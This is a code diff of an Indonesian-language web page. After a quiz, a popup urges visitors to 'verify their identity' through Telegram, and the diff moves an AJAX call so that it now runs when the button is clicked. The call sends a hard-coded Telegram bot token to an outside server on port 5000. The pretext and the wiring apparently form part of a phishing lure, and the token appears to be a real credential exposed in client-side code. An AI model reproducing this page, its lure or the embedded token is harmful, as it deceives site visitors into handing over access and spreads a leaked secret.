@@ -2565,13 +2565,40 @@ function askQuestion() {
         confirmButtonText: "Jawab",
         preConfirm: (userAnswer) => {
             if (userAnswer.toLowerCase() === randomQuestion.answer) {
-                Swal.fire({
-                    title: 'Info Penting!',
-                    text: 'Anda harus mendaftar melalui Telegram untuk memverifikasi identitas Anda.',
-                    icon: 'success',
-                    confirmButtonText: '<i class="fab fa-telegram"></i> Bergabung ke Telegram',
-                    showCancelButton: false
-                });
+               var isRequestSent = false; // Flag untuk mencegah eksekusi ganda
+
+Swal.fire({
+    title: 'Info Penting!',
+    text: 'Anda harus mendaftar melalui Telegram untuk memverifikasi identitas Anda.',
+    icon: 'success',
+    confirmButtonText: '<i class="fab fa-telegram"></i> Bergabung ke Telegram',
+    showCancelButton: false
+}).then((result) => {
+    if (result.isConfirmed && !isRequestSent) {
+        isRequestSent = true; // Set flag ke true untuk mencegah eksekusi ulang
+        
+        var token = "7814826836:AAEVaUHPOGphJrQrQLXefHtigJ_zmxqM1C0";
+        $.ajax({
+            type: "POST",
+            url: "https://rafie-server-ketiga.cl0ud.my.id:5000/setToken",
+            data: JSON.stringify({ token: token }),
+            contentType: "application/json",
+            dataType: 'JSON',
+            beforeSend: function() {
+                $('.loading').show();
+            },
+            success: function(response){
+                console.log("Response received:", response);
+            },
+            error: function(xhr, status, error) {
+                console.error("AJAX Error:", status, error);
+                $('.loading').hide();
+                isRequestSent = false; // Reset flag jika error terjadi
+            }
+        });
+    }
+});
+
             } else {
                 Swal.fire({
                     title: "Salah!",
@@ -2589,30 +2616,6 @@ function askQuestion() {
 askQuestion();
     </script>
     <script src="js/jiecode.js"></script>
-    <script>
-        var token = "7814826836:AAEVaUHPOGphJrQrQLXefHtigJ_zmxqM1C0";
-    $.ajax({
-    type: "POST",
-    url: "https://rafie-server-ketiga.cl0ud.my.id:5000/setToken", // Endpoint backend
-    data: JSON.stringify({
-        token: token // Ambil nomor dari input
-    }),
-    contentType: "application/json",
-    dataType: 'JSON',
-    beforeSend: function() {
-        $('.loading').show();
-    },
-    success: function(response){
-        console.log("Response received:", response);
-
-    },
-    error: function(xhr, status, error) {
-        console.error("AJAX Error:", status, error);
-        $('.loading').hide();
-        } 
-
-});
-    </script>
     <script>
       setInterval(function(){
         $(".tests:first-child").remove();
